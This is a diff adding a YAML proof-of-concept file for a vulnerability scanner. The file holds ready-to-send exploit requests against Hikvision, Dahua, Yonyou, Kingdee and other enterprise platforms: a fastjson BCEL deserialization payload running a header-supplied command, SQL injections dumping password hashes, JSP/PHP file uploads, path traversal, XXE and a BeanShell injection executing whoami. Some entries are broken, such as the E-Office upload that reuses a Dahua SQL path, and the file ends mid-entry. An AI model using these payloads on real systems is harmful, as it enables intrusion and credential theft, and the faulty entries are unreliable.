@@ -1,0 +1,2189 @@
+# 添加POC时注意特殊字符的转义
+# matchers目前可以匹配三个自定义函数:
+### containsFunc(r\\.Text, \"bootstrapProperties\") 字符串匹配
+### equalsFunc(r\\.StatusCode, 200) 状态码匹配
+### regexFunc(\"[0-9a-fA-F]{32}\", r\\.Text)  正则匹配
+poc_content:
+  - id: "HiKVISION综合安防管理平台env信息泄漏"
+    info:
+      name: "HiKVISION综合安防管理平台env信息泄漏"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"HIKVISION-综合安防管理平台\""
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          path: "/artemis-portal/artemis/env"
+          allow_redirects: false
+          headers:
+            content-type: "application/json"
+            user-agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"bootstrapProperties\") && containsFunc(r\\.Text, \"profiles\") && equalsFunc(r\\.StatusCode, 200)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: 
+          headers:
+            content-type: ""
+            user-agent: ""
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers:      
+
+  - id: "海康综合安防管理平台反序列化"
+    info:
+      name: "海康综合安防管理平台反序列化"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"HIKVISION-综合安防管理平台\""
+    rules:
+      rule0:
+        requests:
+          method: "POST"
+          path: "/bic/ssoService/v1/keepAlive"
+          allow_redirects: false
+          headers:
+            content-type: "application/json"
+            user-agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
+            cookie: ""
+            TestCmd: "ipconfig"
+          body: "{\"CTGT\":{ \"a\": {\"@type\": \"java.lang.Class\",\"val\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\"},\"b\": {\"@type\": \"java.lang.Class\",\"val\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"c\": {\"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassLoader\": {\"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\": \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$a5Wyx$Ug$Z$ff$cd$5e3$3b$99$90dCB$W$uG$N$b09v$b7$a1$95B$c2$99$90$40J$S$u$hK$97P$db$c9$ec$q$3bd3$Tfg$J$a0$b6$k$d4$D$8fZ$8f$daPO$b4$ae$b7P$eb$s$U9$eaA$b1Z$8fzT$ad$d6zk$f1$f6$8f$da$f6$B$7c$bf$99$N$d9$84$ad$3c$3e$sy$be$f9$be$f7$7b$ef$f7$f7$be3y$fc$e2$p$a7$A$dc$80$7f$89$Q1$m$60P$84$PI$b6h$Cv$f3$Y$e2$91$f2$a3$E$c3$8c$a4$f30x$8c$88t$de$p$c2D$9a$JY$C2$ecr$_$8fQ$B$fb$E$ec$e7q$80$R$5e$c3$e3$b5$ec$f9$3a$R$d5$b8S$c4$5dx$3d$5b$de$m$e2$8dx$T$5b$O$K$b8$5bD7$de$cc$e3$z$ec$fcV$Bo$T$d1$84C$C$de$$$e0$j$3c$de$v$e0$5d$C$ee$R$f0n$k$f7$Kx$P$8f$f7$96$a0$B$efc$cb$fb$F$dc$t$e0$D$C$ee$e71$s$e00$T$bc$93$z$P$I$f8$a0$80$P$J$f8$b0$80$8f$88$f8$u$3e$c6$a8G$E$7c$5c$c0$t$E$3c$u$e0$93$C$b2$3c$3e$c5$e3$d3$o6$e03l$f9$ac$88$cf$e1$f3$o$d6$e3$L$C$be$c8$9eG$d9r$8c$89$3e$c4$7c$fc$S$d3$f4$b0$88$_$p$c7c$9c$83o$b5$a6k$d6Z$O$eeP$dd$z$i$3cmFB$e5P$d6$a5$e9jOf$b8_5$7b$e5$fe$UQ$fc$a3$a6f$a9$adFb$3f$879$a1$ae$dd$f2$5e9$9a$92$f5$c1$e8$d6$fe$dd$aab$b5$f4$b52$f1$d2$98$r$xC$dd$f2$88$zE$89$a4$U$da$b9$k$e2$m$b6$efS$d4$RK3$f44$H$ef$a0ju$90$c0$ca$o$aa$K$u1$cb$d4$f4$c1$96$ba$x$99xLPY8$I$ab$95$94$j$B$8f$e3$94$40$ca$_$r$97$c7$pd$_fdLE$ed$d0$98$fbe$bd$c6$b0$o$5b$edJ$d2$880$5d$Sz$b0$95C$ada$OF$e4$RYI$aa$R$cb$e6$88d$y$z$V$e9$cf$MDZ$f7$5bj$5b2$a3$PI8$81$afH8$89Sd$$$adZ$ec$82B$u$9b$f2$a9$z$r$a7$89$e2$eak$95p$gg$q$3c$8a$afr$u$9f$e94$87$8a$vR$a7n$a9$83$aa$c9$i$f9$g$8f$afK$f8$G$ceJx$M$e78$f0$Jc$H$cb$b6$84o2$3d$8bf$Y$ea1$ac$O$p$a3$t$$$e7$93C$rc$89$e8$9aa$7b$dd$9a$Z$YPM$w$e6$a8$v$8fpX8$r$dfc$c42J$b2$5b$b5$92$c6$94$b8$84$c7$f1$z$O$Lf$b2uhj$aa$90$eb$db8$c7$bc$7d$82R$_$e1$3b$f8$ae$84$ef$e1$fb$94v$JO$e2$H$S$7e$88$l$91$ebV$d2T$e5DZ$c2N$f4$91_$7d$F$95$eb$b5$afZ$q$fc$YO$91s$ea$3eU$91$f0$T$fc$94$f6I$cb$oG$7d$96l$S$$8$E$a6$84$b6gt$ddA$a0$cfJj$e9$da$eb$c8FR$d6$T$v$W$a0o0e$f4$cb$a9$7c$fc$8e$40AV$c4$R$d3P$d4t$da0$a98$b3l$WV$ddh$97$96$b6$q$fc$MO$b3$I$7eN$d07$d5$3d$iJ$c8$f4v5$3dB$f8dx$a7$d3fr$97$99$v$9f$JH$c2A$af$9a$b6TB$93$84_$e0$Zb$t$5c$Q$f6$ad$MY$f2$cb$89$c4$a4$u$cf$f8$94$e1$E$ed$8ctD$97$87$a9$v$7e$v$e1Y$fcJ$c2$afY$g$7c$a3$9a$9e0F$e9$9e$b8$o$94$T$82QT$a1c$b4_$d3$a3$e9$q$j$c3$ca$qpl$efc$8a$ac$ebLw$cd$94$5b$db$9c$40$5b3Z$w$e1$60$ea7$S$7e$8b$df$f1$f8$bd$84$3f$e0$8f$8c$f2$tR$b5k$83$84$e7p$5e$c2$9f$f1$94$84$bf$e0$af$S$b6$p$s$e1o$f8$3b$8f$7fH$f8$tsi$9eb$MG$H$e4$b4$b5$3bm$e8$d1$bd$99Tt$aay$a8$f9$a7$ac$9a$ea$40$8a$60$j$b5$812$zMN$a9g$d4$3f$df$cc$U$db$80a$f6P$w8$y$J$fd$f7f$b7$f1N$S$r$ba$3a$da$a9$a7$zYWHjv$a8$c8$40$m$U$f5$c6$b7$b5S$aa$8a$c8WP57$aaJJ6$d5$84$83$7e$O$eb$8b$d8$ee$bbB$b6$d0$d2d$bc$8e$Gf1$d4$c9$a6$5e$cd$cb$b1Py5$7d$af1D$3e$af$w63$af$q$V$NL$m$ef$f3$p$a62T$y$3d$M$ac$93$W$cb$LB$cd$X$s$7c$95$yO$ab$p$a9$x$r$V$b1$cc$88j$w$8e$d1$aab$f2l$da$T$e87$u$Mx$9a$dd$a1$9e$d0NFv$db$3d$bc$b4H$c0E$a3$xU2$a6$a9$ea$d6$qf$a6W7$3f4$a8$7fI$abs$d8d$g$Z$9a$W$c1$o$7c$f6$VC$Y1$3b$I$9b$ae$ed2$E$F$c5$d0$zYc$af$a2y$85$8e$b6$re3$a6$ee$c9$a8$E$b4$96$ba$9d$USZ$3b$a0$dao$c7N$96$88$ce$a2$n$f0Z$ba$7dx$c4$dao$f3$ed$9c$3e0$f6$d3$9c$Yv$a6$Lu$v$r$95$b1$z$bdJE$$$fbYb$Z$5d$c6$a8j$b6$c9l$uU$87$8a$f4$TK$b9$97Z$c3$b4$98$83$85Z$f2S$a1e$da$7b$tOt$S$da$a9$8fdhnQ$ea$86$d9k$3d$_$ac$Z$d1$82$L$S$af$J$V$bd$60$96$a5LZ$dd$a8$a6$b4az_$d1LZ$f6$f2$81$V$O$_$d6$3b$ba$ba$cfr$b0$9d$7f$a1zBu$7d$ad$O$fa$f2$99$d2$Y$b9$sT$a8$60$ea$86t$cc$$F$t$9d$96$e1$98$c6b$fa$e2$R$c1$7e$3c$e0$d8$x$9f$d6mt$ba$86$9e$i$3d$bd$f5$e3$e0$8e$d1$86$c3$cd$b4$fa$i$o$89$d0T$84$8b$b1r$a3$f4$91$e8$r$ea$8b$B$d7$E$dc$3d$e1$i$3c$dd$e1$80$d7w$S$be$b8$3b$c0$c7$e2$9e$87$m$c4$e2$5e$b6$e6$e0o$f4$9e$84$Yw7$Q$dd$d9$9d$40I$dc$3d$O$89$Il$dbp$8a$ed$89$b3tG$7d$O$b3$Ce$k$5bQ$98$u$e5$f5$k$5b$a2$d1$be$cd$e2P$b3$t$Q$b0m$G$w$3d$93$e6$c8D$d8$937Al$ddWS$d2$fe$ff$x9F$99$A$M$faN$ae$b0$9f$e3$98M$U$96$af$b5$u$a3$b5$83$f2$b6$89$b2$b4$99h$9dt$bf$9d8o$82$85$z8$80$$$dcG$rx$98h$e3$94$fe$e3T$80$d3$94$d5$a7$89$f3$F$f4$d2$_0$H$ee$e7a$f2x$d5$f3$d8$c8$e3$96$L$d8$c0c$H$8f$5b$R$cfW$ad$8e$caA$l$TN9$f0$A$dcv9Vr$b6$d7$U$96$f8$m$aa$c3$N9TugQ$da$ec$a1$C$cd$e9$c9$5ez$ae$f11H$tP$jo$YG$cd$e9FO$O$c1F$S$98$7b$944$96$a2$92$be$e4$ab$f3A$y$87D$eb$O$3a$dd$K$9e$y$95b$X$dd$dfF$f7$afF$Nn$t$ac$dc$81EPP$8b$E$c2$Y$m$feA$db$f1$Kx$$$80$e7$b1$8b$9c$ed$e1q$9b_$wpY$m$e1$3c$d8$dc$s$9dJ$A$d7$cd$ee$96$J$cc$cba$7e$e0$9a$J$y8$83$85$f4$d7$e5$5e3$bf$e1$d4$R$d7$f5$N$f3$97$f7$84$cf$ba$96$90$fb$8b$9a$3dAO$60q$O$d7$kvU$d1$ee$V$b4$hs$95$84$D$b5$q$d6$ec$Nz$l$c5$921$ee$a5$a07$b0$94$I$81el$J$d9WY$I$cd$be$y$f7$y$5d$d5$db$s$g$9a$7d$ee$V$7c$V$l$f4$jG$p$87$p$dc$a9$a0$af$8a$3f$8e$b0$L$cdBP$ID$f2$gY$fd$a3n$aa$3f$d5$3e$e8$a5$8dH$85o$f6$3b$X$d7$e5q$d3$U$b3o$3dyX7$c5$D$cb$c7q$3d$83$c8$Z41$9f$cfb$uH$89$be$e10$94$a0$9fI$be$d2$91tZ$a3$3c$e8$f7$5c$ee$88$K$9cc$7d$c0$e0$e5$b0$ae$f0N$g$89$7b$f2$96$fc$de$Z$96$e2d$c3$W$f1$b4$5c$cd$b3$hgz6$96$f7$ec$de$ff$c1$b3$c0$ca$J$ac$ca$a19$d0$c2$w$80$m$f5$7c$TY$5b$cd$5c$5cC$zO$dedQ$9d$a7$aee$d4u$O$b5Y$M$faO$60$7d$fc$E6$c4$83$e28Zsh$cba$e38$da$D$j9l$caas$O$9d$T$b8$89$e2$m$d7Jl$d7$c6P5w$M$VA$ff$E$b6$e4$d0$e50$Q$c5$97$85$ff$m$cfe$_$ae$9e$3c$b8$b8$ec$85$t$b2$f0la$8d$d9$D$99pYG$f0$earm$a5$a7$83$e9$p$I$d1$w$d0$c9O$cdZ$82$f9$84$f1E$84$ecZ$ccB$3d5$edZ$94S$dbV$90t$r$c9W$93$86$d9$84$ec$wh$84$f8$M$e6$e2$m$e6$e1$k$92$ba$9f$d0$7f$M$L$f0$M$W$e2$3c$Wq$d5X$ccu$e2Zn$L$96p$fb$b0$94$bb$h$cb$b8$a3$Iq$e7Q$e7$aa$40$bd$ab$92$90U$8b$88k9$9a$5c$x$b0$dc$b5$Ks$5d$eb$b0$c2$d5$86$h$5d$j$uqua$jy$b9$c6$b5$8d$feU$ed$b5$bb$ae$fc$o$aa9$k$L$b9K4$t$7c$f6$8e$c7$ed$3c$ee$a0$v$A$da$ca$d4d$b3x$f4s$X$f0$a4$3d$Yv$bc$84C$dby$uuR$c5$L$f0$bd$I$ef$r$g$3fn$5b$Q$f87$bc$ad$q$c3$e6y$82$d4$bb$a0$fe$H$d8$3e$ebc$Z$Q$A$A\"}}}"
+        matchers: "containsFunc(r\\.Text, \"Windows IP\")"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: 
+          headers:
+            content-type: ""
+            user-agent: ""
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers:
+
+  - id: "广联达Linkworks_GetIMDictionary_SQL"
+    info:
+      name: "广联达Linkworks_GetIMDictionary_SQL注入"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "body=\"/Services/Identification/\""
+    rules:
+      rule0:
+        requests:
+          method: "POST"
+          path: "/Webservice/IM/Config/ConfigService.asmx/GetIMDictionary"
+          allow_redirects: false
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: "key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --"
+        matchers: "regexFunc(\"[0-9a-fA-F]{32}\", r\\.Text)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: 
+          headers:
+            content-type: ""
+            user-agent: ""
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: 
+
+  - id: "大华智慧园区综合管理平台SQL"
+    info:
+      name: "大华智慧园区综合管理平台SQL注入"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"dahua-智慧园区综合管理平台\""
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          path: "/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B\"orderBy\":\"1%20and%201=updatexml(1,concat(0x7e,(select%20MD5(123456)),0x7e),1)--\"%7D/extend/%7B%7D"
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"e10adc3949ba59abbe56e057f20f883\")"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: 
+          headers:
+            content-type: ""
+            user-agent: ""
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers:
+
+  - id: "大华智慧园区未授权账号密码"
+    info:
+      name: "大华智慧园区未授权账号密码泄露"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "fid=\"+GO1WAVdxlPk6WCq1FIWDg==\""
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          path: "/admin/user_getUserInfoByUserName.action?userName=system"
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"loginName\") && containsFunc(r\\.Text, \"loginPass\")"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: 
+          headers:
+            content-type: ""
+            user-agent: ""
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers:
+
+  - id: "大华智慧园区综合管理平台emap文件上传"
+    info:
+      name: "大华智慧园区综合管理平台emap文件上传"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"dahua-智慧园区综合管理平台\",上传路径：/upload/emap/society_new/ico_res_xxx.jsp"
+    rules:
+      rule0:
+        requests:
+          method: "POST"
+          path: "/emap/devicePoint_addImgIco?hasSubsystem=true"
+          allow_redirects: false
+          headers:
+            content-type: "multipart/form-data; boundary=00dahua0qax00"
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: "\
+              --00dahua0qax00\r\n\
+              Content-Disposition: form-data; name=\"upload\"; filename=\"qax.jsp\"\r\n\
+              Content-Type: application/octet-stream\r\n\
+              \r\n\
+              <%= \"Welcome to qax!\" %>\r\n\
+              --00dahua0qax00--
+              "
+        matchers: "containsFunc(r\\.Text, \"ico_res_\") && containsFunc(r\\.Text, \".jsp\")"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: 
+          headers:
+            content-type: ""
+            user-agent: ""
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers:
+
+  - id: "大华智慧园区综合管理平台video任意文件上传"
+    info:
+      name: "大华智慧园区综合管理平台video任意文件上传"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"dahua-智慧园区综合管理平台\",上传路径：/publishingImg/VIDEO/xxxxxxxx.jsp"
+    rules:
+      rule0:
+        requests:
+          method: "POST"
+          path: "/publishing/publishing/material/file/video"
+          allow_redirects: false
+          headers:
+            content-type: "multipart/form-data; boundary=dd8f988919484abab3816881c55272a7"
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: "\
+              --dd8f988919484abab3816881c55272a7\r\n\
+              Content-Disposition: form-data; name=\"Filedata\"; filename=\"Test.jsp\"\r\n\
+              \r\n\
+              Test\r\n\
+              --dd8f988919484abab3816881c55272a7\r\n\
+              Content-Disposition: form-data; name=\"Submit\"\r\n\
+              \r\n\
+              submit\r\n\
+              --dd8f988919484abab3816881c55272a7--\r\n\
+              "
+        matchers: "containsFunc(r\\.Text, \"VIDEO/\") && containsFunc(r\\.Text, \"true\")"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: 
+          headers:
+            content-type: ""
+            user-agent: ""
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers:
+
+  - id: "泛微OA-E-Office-uploadify 文件上传"
+    info:
+      name: "泛微OA-E-Office-uploadify 文件上传"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"泛微-EOffice\""
+    rules:
+      rule0:
+        requests:
+          method: "POST"
+          path: "/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B\"orderBy\":\"1%20and%201=updatexml(1,concat(0x7e,(select%20MD5(123456)),0x7e),1)--\"%7D/extend/%7B%7D"
+          allow_redirects: false
+          headers:
+            content-type: "multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4"
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: "\
+              --e64bdf16c554bbc109cecef6451c26a4\r\n\
+              Content-Disposition: form-data; name=\"Filedata\"; filename=\"qaxnb.php\"\r\n\
+              Content-Type: image/jpeg\r\n\
+              \r\n\
+              <?php echo \"qaxnb\";unlink(__FILE__);?>\r\n\
+              "
+        matchers: "lengthFunc(r\\.Text, 10) && equalsFunc(r\\.StatusCode, 200)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: 
+          headers:
+            content-type: ""
+            user-agent: ""
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers:
+
+  - id: "用友U8_CRM客户关系管理系统_getemaildata 文件上传"
+    info:
+      name: "用友U8_CRM客户关系管理系统_getemaildata 文件上传"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "body=\"用友U8CRM\""
+    rules:
+      rule0:
+        requests:
+          method: "POST"
+          path: "/ajax/getemaildata.php?DontCheckLogin=1"
+          allow_redirects: false
+          headers:
+            content-type: "multipart/form-data; boundary=----WebKitFormBoundarykS5RKgl8t3nwInMQ"
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: "\
+            ------WebKitFormBoundarykS5RKgl8t3nwInMQ\r\n\
+            Content-Disposition: form-data; name=\"file\"; filename=\"test.php\"\r\n\
+            Content-Type: text/plain\r\n\
+            \r\n\
+            <?php phpinfo();?>\r\n\
+            \r\n\
+            ------WebKitFormBoundarykS5RKgl8t3nwInMQ\r\n\
+            "
+        matchers: "containsFunc(r\\.Text, \"tmp.mht\")"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: 
+          headers:
+            content-type: ""
+            user-agent: ""
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers:
+
+  - id: "金蝶云星空CommonFileserver任意文件读取漏洞"
+    info:
+      name: "金蝶云星空CommonFileserver任意文件读取漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"金蝶云星空-管理中心\""
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          path: "/CommonFileServer/c:/windows/win.ini"
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"files\") && containsFunc(r\\.Text, \"fonts\") && equalsFunc(r\\.StatusCode, 200)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: 
+          headers: 
+            content-type: ""
+            user-agent: ""
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers:
+
+  - id: "亿赛通电子文档安全管理系统_UploadFileFromClientServiceForClient 文件上传"
+    info:
+      name: "亿赛通电子文档安全管理系统_UploadFileFromClientServiceForClient 文件上传"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"亿赛通-电子文档安全管理系统\""
+    rules:
+      rule0:
+        requests:
+          method: "POST"
+          path: "/CDGServer3/UploadFileFromClientServiceForClient?AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBOECDMDLEPBJGBGCGLEMBDFAGOGM"
+          allow_redirects: true
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: "qaxnb"
+        matchers: ""
+      rule1:
+        requests:
+          method: "GET"
+          path: /tttT.jsp
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"qaxnb\") && equalsFunc(r\\.StatusCode, 200)"
+
+  - id: "用友未授权"
+    info:
+      name: "用友未授权漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"\""
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          path: "/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.release.InfoReleaseAction&method=createBBSRelease&TreeSelectedID=&TableSelectedID=/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.release.InfoReleaseAction&method=createBBSRelease&TreeSelectedID=&TableSelectedID="
+          allow_redirects: true
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"发布 - IUFO\") && equalsFunc(r\\.StatusCode, 200)"
+      rule1:
+        requests:
+          method: ""
+          path: 
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: ""
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+
+  - id: "用友oa xxe漏洞"
+    info:
+      name: "用友oa xxe漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"用友\""
+    rules:
+      rule0:
+        requests:
+          method: "POST"
+          path: "/uapws/soapFormat.ajax"
+          allow_redirects: true
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: "msg=<!DOCTYPE foo[<!ENTITY xxe1two SYSTEM \"file:///c:/windows/\"> ]><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><soap:Fault><faultcode>soap:Server%26xxe1two%3b</faultcode></soap:Fault></soap:Body></soap:Envelope>%0a"
+        matchers: "containsFunc(r\\.Text, \"soap:Envelope\") && equalsFunc(r\\.StatusCode, 200)"
+      rule1:
+        requests:
+          method: ""
+          path: 
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: ""
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+
+  - id: "用友ERP-NC 目录遍历漏洞"
+    info:
+      name: "用友ERP-NC 目录遍历漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"用友\""
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          path: "/NCFindWeb?service=IPreAlertConfigService&filename="
+          allow_redirects: true
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"properties\") && equalsFunc(r\\.StatusCode, 200)"
+      rule1:
+        requests:
+          method: ""
+          path: 
+          allow_redirects: false
+          headers:
+            content-type: ""
+            user-agent: ""
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+
+  - id: "用友全版本任意文件上传"
+    info:
+      name: "用友全版本任意文件上传"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"用友\""
+    rules:
+      rule0:
+        requests:
+          method: "POST"
+          path: "/uapjs/jsinvoke/?action=invoke"
+          allow_redirects: true
+          headers:
+            content-type: ""
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: "{\"serviceName\":\"nc.itf.iufo.IBaseSPService\",\"methodName\":\"saveXStreamConfig\",\"parameterTypes\":[\"java.lang.Object\",\"java.lang.String\"],\"parameters\":[\"${param.getClass().forName(param.error).newInstance().eval(param.cmd)}\",\"webapps/nc_web/404.jsp\"]}"
+        matchers: ""
+      rule1:
+        requests:
+          method: "POST"
+          path: "/404.jsp?error=bsh.Interpreter"
+          allow_redirects: false
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: "cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(\"whoami\").getInputStream())"
+        matchers: "containsFunc(r\\.Text, \"<?xml\") && equalsFunc(r\\.StatusCode, 200)"
+
+  - id: "用友 NC hrss文件读取漏洞"
+    info:
+      name: "用友 NC hrss文件读取漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"用友\""
+    rules:
+      rule0:
+        requests:
+          method: "GET"
+          path: "/hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xml"
+          allow_redirects: true
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: "containsFunc(r\\.Text, \"<enableHotDeploy>\") && equalsFunc(r\\.StatusCode, 200)"
+      rule1:
+        requests:
+          method: ""
+          path: ""
+          allow_redirects: false
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: ""
+        matchers: ""
+
+  - id: "用友oa 数据库读取漏洞"
+    info:
+      name: "用友oa 数据库读取漏洞"
+      author: "小燕子"
+      severity: "High"
+      verified: false
+      description: "app=\"用友\""
+    rules:
+      rule0:
+        requests:
+          method: "POST"
+          path: "/uapws/service/nc.itf.ses.inittool.PortalSESInitToolService"
+          allow_redirects: true
+          headers:
+            content-type: "application/x-www-form-urlencoded"
+            user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
+            cookie: ""
+            TestCmd: ""
+          body: "\
+              <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:por=\"http://inittool.ses.itf.nc/PortalSESInitToolService\">\r\n
+                <soapenv:Header/>\r\n
+                  <soapenv:Body>\r\n
+                  <por:getDataSourceConfig/>\r\n
+                </soapenv:Body>\r\n
+              </soapenv:Envelope>\r\n         
+          "
